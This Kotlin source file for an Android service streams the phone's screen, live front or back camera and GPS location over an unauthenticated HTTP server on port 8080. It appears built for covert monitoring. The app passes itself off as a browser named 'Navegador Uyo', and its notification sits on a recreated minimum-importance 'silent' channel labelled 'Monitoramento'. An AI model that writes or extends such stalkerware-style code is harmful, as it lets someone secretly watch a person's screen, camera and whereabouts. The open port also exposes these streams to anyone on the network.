package com.casanova.espelho

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.annotation.SuppressLint
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Surface
import java.io.ByteArrayOutputStream
import java.io.OutputStream
import java.net.ServerSocket
import java.net.Socket
import java.util.concurrent.atomic.AtomicBoolean

class ScreenMirrorService : Service() {

    companion object {
        const val ACTION_PREPARE = "PREPARE"
        const val ACTION_START = "START"
        const val ACTION_STOP = "STOP"
        const val ACTION_CAM = "CAM"
        const val ACTION_CAM_STOP = "CAM_STOP"
        const val EXTRA_RESULT_CODE = "RESULT_CODE"
        const val EXTRA_DATA = "DATA"
        const val EXTRA_FACING = "FACING"
        const val PORT = 8080

        @Volatile var latestJpeg: ByteArray? = null
        @Volatile var lastError: String? = null
        @Volatile var frames: Long = 0
        @Volatile var requests: Long = 0
        @Volatile var latestCamJpeg: ByteArray? = null
        @Volatile var camFrames: Long = 0
        @Volatile var camOn: Boolean = false
        @Volatile var camFacing: Int = CameraCharacteristics.LENS_FACING_BACK
        @Volatile var lastLat: Double? = null
        @Volatile var lastLon: Double? = null
        @Volatile var lastAcc: Float = 0f
        @Volatile var lastLocTime: Long = 0
    }

    private val running = AtomicBoolean(false)
    private val serverOn = AtomicBoolean(false)
    private var serverThread: Thread? = null
    private var captureThread: Thread? = null
    private var serverSocket: ServerSocket? = null
    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraSession: CameraCaptureSession? = null
    private var camReader: ImageReader? = null
    private var locMgr: LocationManager? = null
    private val locListener = object : LocationListener {
        override fun onLocationChanged(l: Location) {
            lastLat = l.latitude
            lastLon = l.longitude
            lastAcc = l.accuracy
            lastLocTime = System.currentTimeMillis()
        }
        @Suppress("DEPRECATION", "OverridingDeprecatedMember")
        override fun onStatusChanged(p: String?, s: Int, e: Bundle?) { }
        override fun onProviderEnabled(p: String) { }
        override fun onProviderDisabled(p: String) { }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        MainActivity.installHandler(this)
        MainActivity.log(this, "svc: created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            // sistema reiniciou o servico: garante foreground, sem captura
            try { startForegroundWithNotification() } catch (_: Exception) { }
            lastError = "Serviço reiniciado: toque Parar e Iniciar de novo."
            return START_NOT_STICKY
        }
        when (intent.action) {
            ACTION_STOP -> {
                stopStreaming()
                stopCamera()
                stopLocation()
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_PREPARE -> {
                // foreground IMEDIATO: nada antes que possa falhar
                MainActivity.log(this, "svc: prepare")
                startForegroundWithNotification()
                MainActivity.log(this, "svc: foreground ok")
                return START_STICKY
            }
            ACTION_START -> {
                val code = intent.getIntExtra(EXTRA_RESULT_CODE, 999)
                val data: Intent? = if (Build.VERSION.SDK_INT >= 33) {
                    intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(EXTRA_DATA)
                }
                if (code != android.app.Activity.RESULT_OK || data == null) {
                    lastError = "Falha interna (codigo permissão)."
                    stopSelf()
                    return START_NOT_STICKY
                }
                try {
                    startForegroundWithNotification()
                } catch (e: Exception) {
                    lastError = "Sem permissão de notificação/serviço: ${e.message}"
                    stopSelf()
                    return START_NOT_STICKY
                }
                try {
                    startStreaming(code, data)
                } catch (t: Throwable) {
                    lastError = "Falha ao iniciar captura: ${t.message}"
                    stopStreaming()
                    stopSelf()
                }
                return START_STICKY
            }
            ACTION_CAM -> {
                // garante foreground antes de mexer com camera/gps
                try { startForegroundWithNotification() } catch (e: Exception) {
                    lastError = "Serviço: ${e.message}"
                    stopSelf()
                    return START_NOT_STICKY
                }
                ensureServer()
                startLocation()
                startCamera(intent.getIntExtra(EXTRA_FACING, CameraCharacteristics.LENS_FACING_BACK))
                return START_STICKY
            }
            ACTION_CAM_STOP -> {
                stopCamera()
                return START_STICKY
            }
        }
        return START_NOT_STICKY
    }

    private fun startForegroundWithNotification() {
        val chId = "espelho_sil"
        val nm = getSystemService(NotificationManager::class.java)
        try { nm.deleteNotificationChannel("espelho") } catch (_: Exception) { }
        nm.createNotificationChannel(
            NotificationChannel(chId, "Monitoramento", NotificationManager.IMPORTANCE_MIN)
        )
        val n: Notification = Notification.Builder(this, chId)
            .setContentTitle("Navegador Uyo ativo")
            .setContentText("Tela, câmera e GPS em uso")
            .setSmallIcon(R.drawable.ic_stat_uyo)
            .setLargeIcon(android.graphics.BitmapFactory.decodeResource(resources, R.drawable.ic_notif_blue))
            .setOngoing(true)
            .setShowWhen(false)
            .setOnlyAlertOnce(true)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(1, n)
        }
    }

    private fun startStreaming(resultCode: Int, data: Intent) {
        if (running.get()) {
            stopStreaming()
            try { Thread.sleep(300) } catch (_: InterruptedException) { }
        }
        running.set(true)
        lastError = null
        frames = 0
        latestJpeg = null

        try {
            val mgr = getSystemService(MediaProjectionManager::class.java)
            MainActivity.log(this, "svc: getProjection")
            projection = mgr.getMediaProjection(resultCode, data)
            MainActivity.log(this, "svc: projection ok")
            try {
                projection?.registerCallback(object : MediaProjection.Callback() {}, Handler(Looper.getMainLooper()))
            } catch (_: Exception) { }

            val metrics = resources.displayMetrics
            val width = 720
            val height = (width * metrics.heightPixels / metrics.widthPixels.toFloat()).toInt().coerceAtMost(1280)
            val dpi = metrics.densityDpi

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            virtualDisplay = projection?.createVirtualDisplay(
                "espelho", width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, null
            )
            MainActivity.log(this, "svc: vd ok " + width + "x" + height)

        captureThread = Thread {
            while (running.get()) {
                try {
                    val img = imageReader?.acquireLatestImage()
                    if (img != null) {
                        try {
                            latestJpeg = imageToJpeg(img)
                            frames++
                        } catch (_: Exception) {
                        } finally {
                            img.close()
                        }
                    } else {
                        Thread.sleep(50)
                    }
                } catch (_: Exception) {
                    try { Thread.sleep(100) } catch (_: InterruptedException) { break }
                }
            }
        }.also { it.isDaemon = true; it.start() }

        ensureServer()
        } catch (t: Throwable) {
            lastError = "Falha captura/tela: ${t.message}"
            stopStreaming()
            throw t
        }
    }

    private fun ensureServer() {
        if (serverThread?.isAlive == true) return
        serverOn.set(true)
        serverThread = Thread {
            try {
                val ss = ServerSocket(PORT)
                serverSocket = ss
                MainActivity.log(this, "svc: server ok 8080")
                while (serverOn.get()) {
                    try {
                        val client = ss.accept()
                        requests++
                        Thread { handleClient(client) }.also { it.isDaemon = true; it.start() }
                    } catch (_: Exception) {
                        if (!serverOn.get()) break
                    }
                }
            } catch (e: Exception) {
                lastError = "Porta 8080 ocupada/bloqueada: ${e.message}"
            }
        }.also { it.isDaemon = true; it.start() }
    }

    private fun imageToJpeg(img: android.media.Image): ByteArray {
        val plane = img.planes[0]
        val buffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val rowPadding = rowStride - pixelStride * img.width
        val w = img.width + rowPadding / pixelStride
        val bmp = Bitmap.createBitmap(w, img.height, Bitmap.Config.ARGB_8888)
        bmp.copyPixelsFromBuffer(buffer)
        val cropped = if (w != img.width) {
            Bitmap.createBitmap(bmp, 0, 0, img.width, img.height)
        } else bmp
        val out = ByteArrayOutputStream()
        cropped.compress(Bitmap.CompressFormat.JPEG, 60, out)
        if (cropped !== bmp) cropped.recycle()
        bmp.recycle()
        return out.toByteArray()
    }

    private fun handleClient(sock: Socket) {
        try {
            sock.soTimeout = 5000
            val input = sock.getInputStream().bufferedReader()
            val out: OutputStream = sock.getOutputStream()
            val request = input.readLine() ?: ""
            // consome headers
            while (true) {
                val l = input.readLine() ?: break
                if (l.isEmpty()) break
            }
            if (request.contains("/cam.mjpeg")) {
                serveMjpeg(out, sock, true)
            } else if (request.contains("/stream")) {
                serveMjpeg(out, sock, false)
            } else if (request.contains("/status")) {
                val lat = lastLat
                val lon = lastLon
                val json = "{\"frames\":" + frames + ",\"visitas\":" + requests +
                    ",\"camFrames\":" + camFrames + ",\"camOn\":" + camOn +
                    ",\"lat\":" + (lat?.toString() ?: "null") +
                    ",\"lon\":" + (lon?.toString() ?: "null") +
                    ",\"acc\":" + lastAcc + "}"
                val resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n" +
                    "Content-Length: ${json.toByteArray().size}\r\nConnection: close\r\n\r\n$json"
                out.write(resp.toByteArray())
                out.flush()
            } else {
                val err = lastError
                val lat = lastLat
                val lon = lastLon
                val loc = if (lat != null && lon != null) "$lat,$lon (±${lastAcc}m)" else "sem GPS ainda"
                val html = "<html><head><meta charset=utf-8><meta http-equiv=refresh content=5><title>Navegador Uyo</title></head>" +
                    "<body style='background:#111;color:#fff;text-align:center;font-family:sans-serif'>" +
                    "<h2>Navegador Uyo - ao vivo</h2>" +
                    "<h3>Tela</h3><img src='/stream' style='max-width:100%;border:2px solid #444'/>" +
                    "<h3>Camera " + (if (camOn) (if (camFacing == CameraCharacteristics.LENS_FACING_FRONT) "frontal" else "traseira") else "(desligada)") + "</h3>" +
                    "<img src='/cam.mjpeg' style='max-width:100%;border:2px solid #444'/>" +
                    "<p>Localizacao: " + loc + "</p>" +
                    "<p>frames=" + frames + " camFrames=" + camFrames + " visitas=" + requests + (if (err != null) " erro=" + err else "") + "</p>" +
                    "</body></html>"
                val resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n" +
                    "Content-Length: ${html.toByteArray().size}\r\nConnection: close\r\n\r\n$html"
                out.write(resp.toByteArray())
                out.flush()
            }
        } catch (_: Exception) {
        } finally {
            try { sock.close() } catch (_: Exception) { }
        }
    }

    private fun serveMjpeg(out: OutputStream, sock: Socket, cam: Boolean) {
        val header = "HTTP/1.1 200 OK\r\n" +
            "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n" +
            "Connection: close\r\n\r\n"
        out.write(header.toByteArray())
        out.flush()
        while (serverOn.get() && !sock.isClosed) {
            val frame = if (cam) latestCamJpeg else latestJpeg
            if (frame != null) {
                val part = "--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n"
                out.write(part.toByteArray())
                out.write(frame)
                out.write("\r\n".toByteArray())
                out.flush()
            }
            Thread.sleep(100) // ~10 fps
        }
    }

    @SuppressLint("MissingPermission")
    fun startCamera(facing: Int) {
        try {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                lastError = "Sem permissão da câmera."
                return
            }
            stopCamera()
            val cm = getSystemService(CameraManager::class.java)
            val id = cm.cameraIdList.firstOrNull {
                cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing
            }
            if (id == null) {
                lastError = "Câmera não encontrada."
                return
            }
            camFacing = facing
            MainActivity.log(this, "svc: cam abrindo")
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    try {
                        cameraDevice = d
                        val map = cm.getCameraCharacteristics(id)
                            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        val sz = map?.getOutputSizes(ImageFormat.JPEG)
                            ?.firstOrNull { it.width == 640 && it.height == 480 }
                            ?: map?.getOutputSizes(ImageFormat.JPEG)?.minByOrNull { it.width * it.height }
                        if (sz == null) {
                            lastError = "Câmera sem saída JPEG."
                            return
                        }
                        camReader = ImageReader.newInstance(sz.width, sz.height, ImageFormat.JPEG, 2)
                        camReader?.setOnImageAvailableListener({ r ->
                            try {
                                r.acquireLatestImage()?.use { img ->
                                    val buf = img.planes[0].buffer
                                    val b = ByteArray(buf.remaining())
                                    buf.get(b)
                                    latestCamJpeg = b
                                    camFrames++
                                }
                            } catch (_: Exception) { }
                        }, Handler(Looper.getMainLooper()))
                        val surf = camReader!!.surface
                        d.createCaptureSession(listOf(surf), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                cameraSession = s
                                try {
                                    val req = d.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        .apply { addTarget(surf) }.build()
                                    s.setRepeatingRequest(req, null, null)
                                    camOn = true
                                    latestCamJpeg = null
                                    MainActivity.log(this@ScreenMirrorService, "svc: cam ok")
                                } catch (e: Exception) {
                                    lastError = "Câmera: ${e.message}"
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                lastError = "Câmera falhou ao configurar."
                            }
                        }, null)
                    } catch (t: Throwable) {
                        lastError = "Câmera: ${t.message}"
                    }
                }
                override fun onDisconnected(d: CameraDevice) {
                    try { d.close() } catch (_: Exception) { }
                    cameraDevice = null
                    camOn = false
                }
                override fun onError(d: CameraDevice, e: Int) {
                    lastError = "Erro câmera: $e"
                    try { d.close() } catch (_: Exception) { }
                    cameraDevice = null
                    camOn = false
                }
            }, null)
        } catch (e: SecurityException) {
            lastError = "Sem permissão da câmera."
        } catch (t: Throwable) {
            lastError = "Câmera: ${t.message}"
        }
    }

    fun stopCamera() {
        camOn = false
        latestCamJpeg = null
        try { cameraSession?.close() } catch (_: Exception) { }
        try { cameraDevice?.close() } catch (_: Exception) { }
        try { camReader?.close() } catch (_: Exception) { }
        cameraSession = null
        cameraDevice = null
        camReader = null
    }

    fun startLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) !=
                android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                lastError = "Sem permissão de localização."
                return
            }
            locMgr = getSystemService(LocationManager::class.java)
            val looper = Looper.getMainLooper()
            try {
                locMgr?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000L, 0f, locListener, looper)
            } catch (_: Exception) { }
            try {
                locMgr?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000L, 0f, locListener, looper)
            } catch (_: Exception) { }
            try {
                val last = locMgr?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: locMgr?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (last != null) {
                    lastLat = last.latitude
                    lastLon = last.longitude
                    lastAcc = last.accuracy
                    lastLocTime = System.currentTimeMillis()
                }
            } catch (_: Exception) { }
            MainActivity.log(this, "svc: gps ok")
        } catch (e: SecurityException) {
            lastError = "Sem permissão de localização."
        } catch (t: Throwable) {
            lastError = "GPS: ${t.message}"
        }
    }

    fun stopLocation() {
        try { locMgr?.removeUpdates(locListener) } catch (_: Exception) { }
        locMgr = null
    }

    private fun stopStreaming() {
        running.set(false)
        serverOn.set(false)
        try { serverSocket?.close() } catch (_: Exception) { }
        try { virtualDisplay?.release() } catch (_: Exception) { }
        try { imageReader?.close() } catch (_: Exception) { }
        try { projection?.stop() } catch (_: Exception) { }
        serverThread?.interrupt()
        captureThread?.interrupt()
    }

    override fun onDestroy() {
        stopStreaming()
        stopCamera()
        stopLocation()
        super.onDestroy()
    }
}
